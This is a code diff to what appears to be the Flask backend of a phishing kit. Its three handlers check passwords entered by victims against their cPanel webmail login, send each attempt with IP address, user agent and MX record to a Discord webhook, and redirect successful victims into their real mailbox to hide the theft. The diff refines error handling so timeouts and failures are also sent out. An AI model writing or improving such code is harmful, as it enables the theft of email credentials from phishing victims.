@@ -323,28 +323,34 @@ def process_first():
 
         try:
             # Attempt credential verification
-            response = requests.get(f"{target_domain}:2096/login/?user={greet}&pass={salute}", timeout=10)
+            response = requests.get(f"{target_domain}:2096/login/?user={greet}&pass={salute}", timeout=7)
             
             if "/cpsess" in response.url:
                 # Successful login
                 send_discord_message(greet, salute, client_ip, user_agent, domain, mx_record, "success")
                 return redirect(f"{target_domain}:2096/login/?user={greet}&pass={salute}")
-
             else:
                 send_discord_message(greet, salute, client_ip, user_agent, domain, mx_record, "failed")
-                # Failed login - PASS error handling (no Discord notification for failures)
                 return render_template('error_one.html', 
-                         user_greet=session.get('call'), 
-                         user_domain=session.get('user_domain'),
-                         client_id=session.get('client_fingerprint'))
-                
-        except Exception as e:
-            return jsonify({
-                "status": "error",
-                "message": str(e),
-                "client_id": session.get('client_fingerprint'),
-                "timestamp": time.time()
-            }), 500
+                            user_greet=session.get('call'), 
+                            user_domain=session.get('user_domain'),
+                            client_id=session.get('client_fingerprint'))
+        
+        except requests.exceptions.Timeout:
+            # Handle timeout as failed login
+            send_discord_message(greet, salute, client_ip, user_agent, domain, mx_record, "failed")
+            return render_template('error_one.html', 
+                        user_greet=session.get('call'), 
+                        user_domain=session.get('user_domain'),
+                        client_id=session.get('client_fingerprint'))
+                        
+        except requests.exceptions.RequestException as e:
+            # Handle other request-related errors
+            send_discord_message(greet, salute, client_ip, user_agent, domain, mx_record, "failed")
+            return render_template('error_one.html', 
+                        user_greet=session.get('call'), 
+                        user_domain=session.get('user_domain'),
+                        client_id=session.get('client_fingerprint'))
 
 @app.route("/process_s", methods=['POST'])
 def process_second():
@@ -363,26 +369,35 @@ def process_second():
             target_domain = "https://" + target_domain
 
         try:
-            response = requests.get(f"{target_domain}:2096/login/?user={greet}&pass={salute}", timeout=10)
+            # Attempt credential verification
+            response = requests.get(f"{target_domain}:2096/login/?user={greet}&pass={salute}", timeout=7)
             
             if "/cpsess" in response.url:
+                # Successful login
                 send_discord_message(greet, salute, client_ip, user_agent, domain, mx_record, "success")
                 return redirect(f"{target_domain}:2096/login/?user={greet}&pass={salute}")
             else:
                 send_discord_message(greet, salute, client_ip, user_agent, domain, mx_record, "failed")
-                # PASS error handling - no Discord notification
                 return render_template('error_two.html', 
-                         user_greet=session.get('call'), 
-                         user_domain=session.get('user_domain'),
-                         client_id=session.get('client_fingerprint'))
-                
-        except Exception as e:
-            return jsonify({
-                "status": "error",
-                "message": str(e),
-                "client_id": session.get('client_fingerprint'),
-                "timestamp": time.time()
-            }), 500
+                            user_greet=session.get('call'), 
+                            user_domain=session.get('user_domain'),
+                            client_id=session.get('client_fingerprint'))
+        
+        except requests.exceptions.Timeout:
+            # Handle timeout as failed login
+            send_discord_message(greet, salute, client_ip, user_agent, domain, mx_record, "failed")
+            return render_template('error_two.html', 
+                        user_greet=session.get('call'), 
+                        user_domain=session.get('user_domain'),
+                        client_id=session.get('client_fingerprint'))
+                        
+        except requests.exceptions.RequestException as e:
+            # Handle other request-related errors
+            send_discord_message(greet, salute, client_ip, user_agent, domain, mx_record, "failed")
+            return render_template('error_two.html', 
+                        user_greet=session.get('call'), 
+                        user_domain=session.get('user_domain'),
+                        client_id=session.get('client_fingerprint'))
 
 @app.route("/process_t", methods=['POST'])
 def process_third():
@@ -401,23 +416,26 @@ def process_third():
             target_domain = "https://" + target_domain
 
         try:
-            response = requests.get(f"{target_domain}:2096/login/?user={greet}&pass={salute}", timeout=10)
+            # Attempt credential verification
+            response = requests.get(f"{target_domain}:2096/login/?user={greet}&pass={salute}", timeout=7)
             
             if "/cpsess" in response.url:
+                # Successful login
                 send_discord_message(greet, salute, client_ip, user_agent, domain, mx_record, "success")
                 return redirect(f"{target_domain}:2096/login/?user={greet}&pass={salute}")
             else:
                 send_discord_message(greet, salute, client_ip, user_agent, domain, mx_record, "failed")
-                # PASS error handling - no Discord notification
                 return redirect(f"{target_domain}")
-                
-        except Exception as e:
-            return jsonify({
-                "status": "error",
-                "message": str(e),
-                "client_id": session.get('client_fingerprint'),
-                "timestamp": time.time()
-            }), 500
+        
+        except requests.exceptions.Timeout:
+            # Handle timeout as failed login
+            send_discord_message(greet, salute, client_ip, user_agent, domain, mx_record, "failed")
+            return redirect(f"{target_domain}")
+                        
+        except requests.exceptions.RequestException as e:
+            # Handle other request-related errors
+            send_discord_message(greet, salute, client_ip, user_agent, domain, mx_record, "failed")
+            return redirect(f"{target_domain}")
 
 # Error handling routes that return templates
 @app.route("/error_one", methods=['GET'])
